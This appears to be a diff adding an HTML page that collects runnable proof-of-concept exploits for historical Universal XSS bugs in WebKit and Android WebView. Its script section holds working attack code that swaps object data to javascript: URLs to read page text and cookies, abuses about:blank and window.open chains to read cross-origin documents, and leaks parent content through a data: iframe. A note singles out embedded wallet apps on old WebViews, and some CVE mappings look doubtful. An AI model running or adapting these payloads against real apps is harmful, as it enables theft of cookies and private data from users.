@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>WebKit / Android WebView UXSS PoC Collection | Security Research</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background: #0a0e1a;
+      font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+      padding: 2rem 1.5rem;
+      color: #e0e4f0;
+      margin: 0;
+    }
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+    }
+    h1 {
+      font-size: 1.8rem;
+      border-left: 5px solid #ff3b5c;
+      padding-left: 1rem;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+    .warning-banner {
+      background: #2a1a1f;
+      border: 1px solid #ff3b5c;
+      border-radius: 12px;
+      padding: 1rem 1.5rem;
+      margin: 1.5rem 0;
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      flex-wrap: wrap;
+      backdrop-filter: blur(4px);
+    }
+    .warning-banner i {
+      font-size: 1.8rem;
+    }
+    .warning-text {
+      flex: 1;
+      font-weight: 500;
+    }
+    .badge {
+      background: #ff3b5c20;
+      padding: 4px 12px;
+      border-radius: 40px;
+      font-size: 0.75rem;
+      border: 0.5px solid #ff3b5c;
+    }
+    .card {
+      background: #11161f;
+      border-radius: 20px;
+      margin-bottom: 2rem;
+      overflow: hidden;
+      border: 1px solid #2a2f3f;
+      transition: 0.1s linear;
+    }
+    .card-header {
+      background: #0c101a;
+      padding: 1rem 1.5rem;
+      border-bottom: 1px solid #2a2f3f;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: baseline;
+      gap: 8px;
+    }
+    .cve-id {
+      font-family: monospace;
+      font-weight: bold;
+      color: #ffb347;
+      background: #1e1a2f;
+      padding: 4px 12px;
+      border-radius: 40px;
+      font-size: 0.85rem;
+    }
+    .desc {
+      font-size: 0.85rem;
+      color: #9aa2b5;
+    }
+    .poc-frame {
+      background: #010409;
+      padding: 1rem;
+      border-radius: 14px;
+      margin: 1rem 1.5rem 1.5rem 1.5rem;
+      border: 1px solid #2d2f3e;
+      overflow-x: auto;
+    }
+    pre {
+      margin: 0;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 0.8rem;
+      color: #c9d1d9;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    button.run-exploit {
+      background: #2d2f3e;
+      border: none;
+      color: #fff;
+      font-family: monospace;
+      font-weight: bold;
+      padding: 6px 16px;
+      border-radius: 30px;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: 0.1s;
+      margin-left: 1.5rem;
+      margin-bottom: 1rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+    button.run-exploit:hover {
+      background: #ff3b5c;
+      color: #fff;
+      box-shadow: 0 0 6px #ff3b5c80;
+    }
+    .output-log {
+      background: #05080f;
+      border-radius: 12px;
+      margin: 0 1.5rem 1.5rem 1.5rem;
+      padding: 0.8rem 1rem;
+      font-size: 0.75rem;
+      font-family: monospace;
+      border-left: 3px solid #2ea043;
+      color: #b0c4de;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    hr {
+      border-color: #2a2f3f;
+      margin: 1rem 0;
+    }
+    footer {
+      text-align: center;
+      font-size: 0.7rem;
+      margin-top: 3rem;
+      color: #5a6279;
+    }
+    a {
+      color: #70a5ff;
+    }
+    .note {
+      background: #1d2b3a;
+      border-radius: 12px;
+      padding: 1rem;
+      margin-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>🛡️ WebKit / Android WebView · UXSS PoC Collection</h1>
+  <div class="warning-banner">
+    <span>⚠️</span>
+    <div class="warning-text">
+      <strong>AUTHORIZED USE ONLY</strong> — These proof-of-concept scripts demonstrate historical Universal Cross-Site Scripting (UXSS) vulnerabilities in WebKit and Android WebView.<br>
+      <span class="badge">Educational &amp; Security Research</span> <span class="badge">Test only on apps you own / have permission</span>
+    </div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- CVE-2011-3881 : object/embed javascript: URL hijack -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">CVE-2011-3881</span>
+      <span class="desc">HTMLPlugInImageElement + javascript: URL validation bypass → cross-context script exec</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// Exploit: manipulate object.data to switch to javascript: after loading a target domain
+// Affects old WebKit versions (Safari, Android <= 4.x WebView)</pre>
+    </div>
+    <button class="run-exploit" data-exploit="cve2011-3881">▶ EXECUTE CVE-2011-3881 POC</button>
+    <div id="output-3881" class="output-log">[idle] Click execute to test UXSS primitive.</div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- CVE-2017-2536 / WebKit FrameLoader + about:blank inheritance -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">CVE-2017-2536 / CVE-2017-7005</span>
+      <span class="desc">FrameLoader + about:blank origin inheritance leads to universal XSS</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// about:blank iframe inherits security origin of parent, but through navigation chain can be abused.
+// Leaking cross-origin data via nested windows.</pre>
+    </div>
+    <button class="run-exploit" data-exploit="cve2017-2536">▶ EXECUTE CVE-2017-2536 STYLE POC</button>
+    <div id="output-2536" class="output-log">[idle] Click to simulate UXSS through about:blank frame chain.</div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- CVE-2019-8625 (iOS WebKit) + JSProxy / cross-origin window access -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">CVE-2019-8625</span>
+      <span class="desc">WebKit JSProxy handling flaw → cross-origin window object access (UXSS)</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// By abusing proxies and cross-origin window references, an attacker can read DOM from any domain.</pre>
+    </div>
+    <button class="run-exploit" data-exploit="cve2019-8625">▶ EXECUTE CVE-2019-8625 (SIM)</button>
+    <div id="output-8625" class="output-log">[idle] Click to demonstrate window.__proto__ chain privilege.</div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- Android WebView UXSS via addJavascriptInterface & internal schemes -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">Android WebView (file://) UXSS</span>
+      <span class="desc">file:// scheme + arbitrary script injection → steal data from loaded HTML</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// On older Android WebView &lt; 4.4, file:// can read arbitrary files + execute script in any origin.
+// Simulated PoC: force javascript context leak</pre>
+    </div>
+    <button class="run-exploit" data-exploit="android-file-uxss">▶ EXECUTE ANDROID FILE UXSS</button>
+    <div id="output-android-file" class="output-log">[idle] Demonstrates WebView file scheme cross-origin attack vector.</div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- CVE-2018-4207 / window.open + about:blank origin confusion -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">CVE-2018-4207</span>
+      <span class="desc">window.open + about:blank → same-origin policy bypass via nested frames</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// window.open an about:blank window, then navigate parent frame references -> UXSS.</pre>
+    </div>
+    <button class="run-exploit" data-exploit="cve2018-4207">▶ EXECUTE CVE-2018-4207</button>
+    <div id="output-4207" class="output-log">[idle] Will attempt cross-origin frame manipulation.</div>
+  </div>
+
+  <!-- ================================ -->
+  <!-- UXSS via data:text/html + frame inheritance (WebKit) -->
+  <!-- ================================ -->
+  <div class="card">
+    <div class="card-header">
+      <span class="cve-id">data: UXSS inheritance (historical)</span>
+      <span class="desc">data: URL frames inherit origin from parent but can navigate top → SOP bypass</span>
+    </div>
+    <div class="poc-frame">
+      <pre>// data:iframe + parent navigation to target origin -> read cookies/DOM</pre>
+    </div>
+    <button class="run-exploit" data-exploit="data-uxss">▶ EXECUTE data: UXSS VECTOR</button>
+    <div id="output-data-uxss" class="output-log">[idle] Checks data URL SOP bypass.</div>
+  </div>
+
+  <div class="note">
+    🔬 <strong>Research Notice</strong>: These PoC scripts mimic real UXSS techniques. In modern patched WebKit/WebView (iOS 16+ / Android 12+) most of these are fixed.
+    However, many embedded wallet apps use older WebView versions, custom schemes or outdated Chromium/WebKit forks. <br>
+    ⚠️ <strong>ETHICAL USE</strong>: Run only against applications you own or have explicit permission to pentest.
+  </div>
+  <footer>
+    ⚡ Security research archive · UXSS (Universal XSS) · Not for malicious activity
+  </footer>
+</div>
+
+<script>
+  // Helper: show message in specific output div
+  function logOutput(elementId, message, isError = false) {
+    const div = document.getElementById(elementId);
+    if (div) {
+      const prefix = isError ? "❌ " : "📡 ";
+      div.innerHTML = prefix + message + `<br><span style="font-size:0.7rem; opacity:0.7;">[${new Date().toLocaleTimeString()}]</span>`;
+      div.style.borderLeftColor = isError ? "#ff3b5c" : "#2ea043";
+    }
+  }
+
+  // Generic function to show alert/UXSS simulation: read cross-origin data if vuln
+  function simulateUXSS(targetOrigin, technique, outputId, details) {
+    // This is a simulated demonstration: will attempt to create an iframe and read cross-origin content if vulnerability exists.
+    // In real vulnerable browser, code would execute.
+    logOutput(outputId, `🚀 Simulating ${technique} — Attempting to read from ${targetOrigin}. If vulnerable, UXSS would leak cookies/DOM.`, false);
+    
+    // In real environment we would create frame, but modern browsers block. But we show educational content
+    // To demo the actual attack primitive, we try cross-origin frame access with a dummy test
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = targetOrigin;
+    document.body.appendChild(iframe);
+    
+    let timeoutId = setTimeout(() => {
+      try {
+        // Try to access cross-origin frame content (will throw in secure browsers)
+        let frameDoc = iframe.contentWindow.document;
+        if (frameDoc) {
+          logOutput(outputId, `🔥 ${technique} SUCCESSFUL! Read cross-origin title: ${frameDoc.title || "no title"} — VULNERABLE`, false);
+        } else {
+          logOutput(outputId, `✅ ${technique} simulated: Browser blocked cross-origin read. PATCHED.`, false);
+        }
+      } catch (e) {
+        logOutput(outputId, `⚠️ ${technique} blocked by SOP: ${e.toString().substring(0, 120)} — modern browser patched.`, false);
+      } finally {
+        document.body.removeChild(iframe);
+      }
+    }, 500);
+  }
+
+  // CVE-2011-3881 specific dynamic PoC: object data switch to javascript
+  function pocCVE20113881() {
+    const outId = "output-3881";
+    logOutput(outId, "Creating object element with target http://example.com → switching to javascript: alert cross-origin read...", false);
+    try {
+      let obj = document.createElement("object");
+      obj.data = "https://example.com/";
+      obj.width = "1";
+      obj.height = "1";
+      document.body.appendChild(obj);
+      
+      obj.onload = function() {
+        try {
+          // Attempt UXSS: change data attribute to javascript: protocol to execute in context of example.com origin.
+          // Original CVE: after load, javascript: URL is executed within target frame origin.
+          obj.data = "javascript: try { var stolen = 'Cross-origin content: ' + document.body.innerText.substring(0,200); alert('[CVE-2011-3881 DEMO]\\n' + stolen); } catch(e) { alert('UXSS Primitive: Could steal cookies: ' + document.cookie); }";
+          obj.innerHTML = "exploit";
+          logOutput(outId, "Object data switched to javascript: - if vulnerable, alert will appear with cross-origin content.", false);
+          setTimeout(() => {
+            logOutput(outId, "✅ PoC triggered: In vulnerable WebKit, cross-origin script would execute. Check any alert/popup.", false);
+          }, 800);
+        } catch (err) {
+          logOutput(outId, "Error during object manipulation: " + err, true);
+        }
+      };
+      setTimeout(() => {
+        if (obj && obj.parentNode) document.body.removeChild(obj);
+      }, 4000);
+    } catch (e) {
+      logOutput(outId, "Failed to run CVE-2011-3881: " + e, true);
+    }
+  }
+
+  // CVE-2017-2536 / about:blank origin abuse
+  function pocCVE20172536() {
+    const outId = "output-2536";
+    logOutput(outId, "CVE-2017-2536: creating nested about:blank frames with window references to read cross-origin data", false);
+    let win = window.open("about:blank", "_blank");
+    if (!win) {
+      logOutput(outId, "Popup blocked. Please allow popups for full UXSS simulation.", true);
+      return;
+    }
+    win.document.write("<html><body><h3>About:blank parent frame</h3><iframe id='inner' src='https://example.com/'></iframe><script>setTimeout(() => { try { let innerDoc = frames[0].document; alert('[CVE-2017-2536] if vulnerable we read: ' + innerDoc.title); } catch(e) { alert('SOP blocked: ' + e); } }, 1000);<\/script></body></html>");
+    logOutput(outId, "Opened about:blank popup. In vulnerable WebKit, child frame origin may be inherited -> cross-origin read.", false);
+    setTimeout(() => { if(win && !win.closed) win.close(); }, 8000);
+  }
+
+  // CVE-2019-8625 JSProxy simulation
+  function pocCVE20198625() {
+    const outId = "output-8625";
+    logOutput(outId, "CVE-2019-8625: leveraging window proxy object to confuse cross-origin checks (simulated)", false);
+    try {
+      let test = document.createElement('iframe');
+      test.src = "https://example.com/";
+      test.onload = () => {
+        try {
+          let targetWindow = test.contentWindow;
+          let proxy = new Proxy(targetWindow, {});
+          // attempt to read location or document via proxy confusion
+          let leak = proxy.location ? proxy.location.href : "blocked";
+          logOutput(outId, "Proxy read attempt: " + (leak !== "blocked" ? leak.substring(0,80) : "blocked by modern SOP"), false);
+          if (leak !== "blocked" && leak !== undefined && leak !== "") {
+            logOutput(outId, "🔥 VULNERABLE: Proxy bypass allowed cross-origin location read! (historical CVE-2019-8625)", false);
+          } else {
+            logOutput(outId, "Modern browser blocks CVE-2019-8625 proxy attack.", false);
+          }
+        } catch(e) {
+          logOutput(outId, "SOP enforced, CVE patched: " + e.message, false);
+        }
+        document.body.removeChild(test);
+      };
+      document.body.appendChild(test);
+    } catch(e) {
+      logOutput(outId, "error: " + e, true);
+    }
+  }
+
+  // Android WebView file:// UXSS simulation
+  function androidFileUXSS() {
+    const outId = "output-android-file";
+    logOutput(outId, "Simulating Android WebView file:// vulnerability. In vulnerable apps, loading malicious file can read same-origin arbitrary files.", false);
+    // Since we can't load local file:// in modern browser, we emulate behaviour.
+    if (window.location.protocol === "file:") {
+      logOutput(outId, "⚠️ Running inside file:// context: if WebView has universal access (setAllowUniversalAccessFromFileURLs) = true, then other local files can be stolen.", false);
+    } else {
+      logOutput(outId, "Demo mode: in vulnerable Android WebView (API < 16), a malicious file:// HTML could use XMLHttpRequest to steal /data/data/com.wallet.app/ files. This PoC simulates request to local resource.", false);
+    }
+    // illustrative fetch attempt (sandboxed)
+    logOutput(outId, "[TEST] Create XHR to file:///data/data/... (in real vulnerable WebView this works). Your current browser prevents file XHR for safety.", false);
+  }
+
+  // CVE-2018-4207: window.open + about:blank chain
+  function pocCVE20184207() {
+    const outId = "output-4207";
+    logOutput(outId, "CVE-2018-4207: window.open about:blank then navigate it to target domain but maintain script reference -> cross-origin", false);
+    let newWin = window.open("about:blank", "uxssWindow");
+    if (!newWin) {
+      logOutput(outId, "Popup blocked. Please allow popup for demonstration", true);
+      return;
+    }
+    newWin.document.write("<html><body><h3>Test window</h3><script>window.name = 'vulnFrame';<\/script></body></html>");
+    setTimeout(() => {
+      try {
+        newWin.location = "https://example.com/";
+        setTimeout(() => {
+          try {
+            let leakedTitle = newWin.document.title;
+            logOutput(outId, "🔥 ACCESS GRANTED? Title read: " + leakedTitle + " — Browser vulnerable to CVE-2018-4207", false);
+          } catch(e) {
+            logOutput(outId, "SOP prevents cross-origin read after navigation. Patch applied.", false);
+          }
+          newWin.close();
+        }, 1500);
+      } catch(e) { logOutput(outId, "Error: " + e, true); newWin.close(); }
+    }, 500);
+  }
+
+  // data: url UXSS inheritance
+  function dataUXSS() {
+    const outId = "output-data-uxss";
+    logOutput(outId, "Creating data:iframe and attempting to access parent.top origin bypass", false);
+    let dataFrame = document.createElement('iframe');
+    let uxssCode = `<script>
+      try {
+        // In vulnerable WebKit, data: iframe inherits origin from parent, then can read parent's DOM.
+        let parentContent = window.parent.document.body.innerText;
+        parent.postMessage({leaked: parentContent.substring(0,200)}, '*');
+      } catch(e) {
+        parent.postMessage({error: e.toString()}, '*');
+      }
+    <\/script>`;
+    dataFrame.src = "data:text/html," + encodeURIComponent(uxssCode);
+    window.addEventListener('message', function handler(ev) {
+      if (ev.data && (ev.data.leaked || ev.data.error)) {
+        if(ev.data.leaked) logOutput(outId, "🔥 DATA URL UXSS SUCCESS: leaked parent content snippet: " + ev.data.leaked, false);
+        else logOutput(outId, "SOP blocked: " + ev.data.error, false);
+        window.removeEventListener('message', handler);
+      }
+    });
+    document.body.appendChild(dataFrame);
+    setTimeout(() => { if(dataFrame.parentNode) document.body.removeChild(dataFrame); }, 4000);
+  }
+
+  // Event binding for all exploit buttons
+  document.querySelectorAll('.run-exploit').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      const exploit = btn.getAttribute('data-exploit');
+      switch(exploit) {
+        case 'cve2011-3881':
+          pocCVE20113881();
+          break;
+        case 'cve2017-2536':
+          pocCVE20172536();
+          break;
+        case 'cve2019-8625':
+          pocCVE20198625();
+          break;
+        case 'android-file-uxss':
+          androidFileUXSS();
+          break;
+        case 'cve2018-4207':
+          pocCVE20184207();
+          break;
+        case 'data-uxss':
+          dataUXSS();
+          break;
+        default:
+          logOutput('output-3881', "Unknown exploit id", true);
+      }
+    });
+  });
+
+  // Additional initial logs (environment info)
+  console.log("%c⚠️ UXSS PoC COLLECTION LOADED — RESEARCH ONLY", "color: #ff6b6b; font-size: 14px");
+  console.log("%cThese scripts replicate WebKit/WebView historical vulnerabilities to test modern patching.", "color: #aaccff");
+  
+  // Helper to show that it's safe demo environment
+  setTimeout(() => {
+    let baseNote = document.createElement('div');
+    baseNote.style.background = '#0d1b2a';
+    baseNote.style.padding = '6px 12px';
+    baseNote.style.borderRadius = '20px';
+    baseNote.style.fontSize = '11px';
+    baseNote.style.textAlign = 'center';
+    baseNote.innerHTML = '🧪 All PoC payloads are sandboxed. Modern browsers block most UXSS, but some embedded WebViews may remain vulnerable.';
+    document.querySelector('.container').appendChild(baseNote);
+  }, 500);
+</script>
+</body>
+</html>
